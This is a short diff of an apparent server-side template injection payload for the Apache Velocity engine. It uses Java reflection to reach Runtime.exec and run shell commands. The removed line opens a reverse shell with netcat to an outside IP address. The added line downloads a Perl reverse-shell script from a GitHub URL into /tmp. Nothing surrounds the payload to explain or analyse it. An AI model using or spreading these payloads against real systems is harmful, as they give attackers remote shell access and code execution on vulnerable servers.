@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("nc -e /bin/sh 104.37.0.50 8080")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("wget -O /tmp/t.pl https://github.com/jlwsellb/code/raw/master/revperlarg.php")
